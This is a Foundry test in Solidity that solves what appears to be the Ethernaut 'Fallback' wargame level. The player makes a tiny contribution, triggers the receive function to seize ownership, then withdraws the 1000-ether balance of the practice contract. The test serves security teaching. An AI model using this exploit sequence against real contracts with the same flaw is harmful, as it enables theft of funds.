// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {FallbackFactory} from "src/levels/FallbackFactory.sol";

interface IFallback {
    function contribute() external payable;

    function withdraw() external;
}

contract FallbackTest is Test {
    FallbackFactory public level;
    IFallback public target;
    address public player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new FallbackFactory();
        player = makeAddr("PLAYER");
        target = IFallback(level.createInstance(player));

        vm.deal(address(target), 1000 ether);
    }

    function test_Fallback() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        target.contribute{value: 1}();

        // Invoke receive function
        (bool sent, ) = payable(address(target)).call{value: 1}("");
        require(sent, "tx failed");

        target.withdraw();

        vm.stopPrank();

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(address(target)), player);
        assertEq(success, true);
    }
}
